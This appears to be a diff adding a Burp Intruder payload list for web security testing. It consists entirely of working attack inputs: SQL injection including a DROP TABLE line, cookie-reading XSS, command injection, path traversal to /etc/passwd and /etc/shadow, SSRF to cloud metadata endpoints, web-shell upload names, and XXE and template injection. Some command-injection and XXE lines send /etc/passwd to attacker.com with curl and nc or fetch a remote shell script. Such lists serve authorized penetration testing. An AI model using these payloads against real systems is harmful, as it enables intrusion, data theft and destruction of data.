@@ -1,0 +1,380 @@
+# AegisForge Burp Intruder Payloads
+# Comprehensive payload list for security testing
+# Use with Burp Suite Intruder for automated vulnerability discovery
+
+# ==========================================
+# SQL INJECTION PAYLOADS (20+)
+# ==========================================
+
+# Boolean-based SQL Injection
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+
+# UNION-based SQL Injection
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT username,password FROM users--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION ALL SELECT NULL,NULL,NULL--
+
+# Time-based Blind SQL Injection
+' AND SLEEP(5)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+'; WAITFOR DELAY '00:00:05'--
+' OR SLEEP(5)--
+1' AND SLEEP(5)--
+1 AND SLEEP(5)--
+
+# Error-based SQL Injection
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=CAST((SELECT @@version) AS int)--
+
+# Stacked Queries
+'; DROP TABLE users--
+'; INSERT INTO users VALUES ('hacker','password')--
+
+# ==========================================
+# XSS PAYLOADS (20+)
+# ==========================================
+
+# Basic XSS
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script>alert(window.origin)</script>
+
+# Image-based XSS
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.cookie)>
+<img/src=x onerror=alert('XSS')>
+<img src=x onerror="alert('XSS')">
+
+# Event Handler XSS
+<body onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<select onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+<marquee onstart=alert('XSS')>
+
+# SVG XSS
+<svg/onload=alert('XSS')>
+<svg><script>alert('XSS')</script></svg>
+<svg><animate onbegin=alert('XSS')>
+
+# Iframe XSS
+<iframe src="javascript:alert('XSS')">
+<iframe src=data:text/html,<script>alert('XSS')</script>>
+
+# Advanced XSS
+<details open ontoggle=alert('XSS')>
+<object data="javascript:alert('XSS')">
+<embed src="javascript:alert('XSS')">
+<form><button formaction=javascript:alert('XSS')>
+<input type="image" src="x" onerror="alert('XSS')">
+
+# Encoded XSS
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+%3Cscript%3Ealert('XSS')%3C/script%3E
+\x3cscript\x3ealert('XSS')\x3c/script\x3e
+
+# ==========================================
+# COMMAND INJECTION PAYLOADS (10+)
+# ==========================================
+
+# Unix Command Injection
+; ls -la
+| ls -la
+|| ls -la
+& ls -la
+&& ls -la
+`ls -la`
+$(ls -la)
+
+# Command Chaining
+; cat /etc/passwd
+| cat /etc/passwd
+; whoami
+; uname -a
+; id
+
+# Time-based Detection
+; sleep 5
+| sleep 5
+& ping -c 10 127.0.0.1
+
+# Data Exfiltration
+; curl http://attacker.com?data=$(cat /etc/passwd)
+; wget http://attacker.com/shell.sh
+; nc attacker.com 4444 < /etc/passwd
+
+# Windows Command Injection
+& dir
+| dir
+& type C:\Windows\win.ini
+& ipconfig
+
+# ==========================================
+# PATH TRAVERSAL PAYLOADS (10+)
+# ==========================================
+
+# Basic Path Traversal
+../
+../../
+../../../
+../../../../
+../../../../../
+../../../../../../
+
+# Absolute Path
+/etc/passwd
+/etc/shadow
+/etc/hosts
+C:\Windows\win.ini
+C:\Windows\System32\drivers\etc\hosts
+
+# Encoded Path Traversal
+..%2F
+..%2F..%2F
+..%252F
+%2e%2e%2f
+%2e%2e%5c
+
+# Double Encoding
+..%252F..%252F
+..%c0%af..%c0%af
+
+# Unicode Encoding
+..%c1%1c
+..%c0%9v
+
+# Null Byte Injection
+../../../etc/passwd%00
+../../../etc/passwd%00.jpg
+
+# Windows Path Traversal
+..\
+..\..\
+..\..\..\
+..\..\..\..\
+
+# Mixed Separators
+..\/..\/
+..\/../
+..\\..//
+
+# ==========================================
+# IDOR/ACCESS CONTROL PAYLOADS
+# ==========================================
+
+# User ID Enumeration
+1
+2
+3
+10
+99
+100
+999
+1000
+9999
+-1
+0
+
+# Common Admin IDs
+admin
+administrator
+root
+1
+100
+
+# UUID Variations
+00000000-0000-0000-0000-000000000000
+11111111-1111-1111-1111-111111111111
+
+# ==========================================
+# SSRF PAYLOADS
+# ==========================================
+
+# Cloud Metadata
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://metadata.google.internal/computeMetadata/v1/
+
+# Localhost Variations
+http://localhost
+http://127.0.0.1
+http://[::1]
+http://0.0.0.0
+http://127.0.0.1:80
+http://127.1
+http://0177.0.0.1
+
+# Internal Networks
+http://10.0.0.1
+http://172.16.0.1
+http://192.168.0.1
+http://192.168.1.1
+
+# DNS Rebinding
+http://localtest.me
+http://localhost.localdomain
+
+# ==========================================
+# OPEN REDIRECT PAYLOADS
+# ==========================================
+
+# External Redirects
+http://evil.com
+https://evil.com
+//evil.com
+///evil.com
+////evil.com
+
+# Protocol Handlers
+javascript:alert('XSS')
+data:text/html,<script>alert('XSS')</script>
+
+# Encoded URLs
+http%3A%2F%2Fevil.com
+https%3A%2F%2Fevil.com
+
+# ==========================================
+# XXE PAYLOADS
+# ==========================================
+
+# Basic XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+
+# Blind XXE
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
+
+# Parameter Entity
+<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">%eval;%exfil;]>
+
+# ==========================================
+# AUTHENTICATION BYPASS
+# ==========================================
+
+# Username Variations
+admin
+administrator
+root
+sa
+system
+guest
+test
+user
+
+# Password Variations
+password
+admin
+12345
+password123
+admin123
+letmein
+welcome
+qwerty
+
+# ==========================================
+# HEADER INJECTION
+# ==========================================
+
+# Host Header Injection
+localhost
+evil.com
+127.0.0.1
+
+# X-Forwarded Headers
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-Host: evil.com
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+
+# ==========================================
+# BUSINESS LOGIC PAYLOADS
+# ==========================================
+
+# Negative Values
+-1
+-100
+-999
+-9999
+
+# Zero Values
+0
+0.00
+
+# Large Values
+999999
+9999999999
+2147483647
+
+# ==========================================
+# FILE UPLOAD PAYLOADS
+# ==========================================
+
+# Dangerous Extensions
+shell.php
+shell.php5
+shell.phtml
+shell.asp
+shell.aspx
+shell.jsp
+shell.jspx
+
+# Double Extensions
+image.jpg.php
+document.pdf.php
+
+# Null Byte
+shell.php%00.jpg
+shell.php\x00.jpg
+
+# ==========================================
+# NoSQL INJECTION
+# ==========================================
+
+# MongoDB
+{"$gt": ""}
+{"$ne": null}
+{"$regex": ".*"}
+
+# ==========================================
+# LDAP INJECTION
+# ==========================================
+
+*
+*)(&
+*)(objectClass=*
+*)(uid=*))(|(uid=*
+
+# ==========================================
+# TEMPLATE INJECTION
+# ==========================================
+
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+*{7*7}
+
+# ==========================================
+# END OF PAYLOADS
+# ==========================================
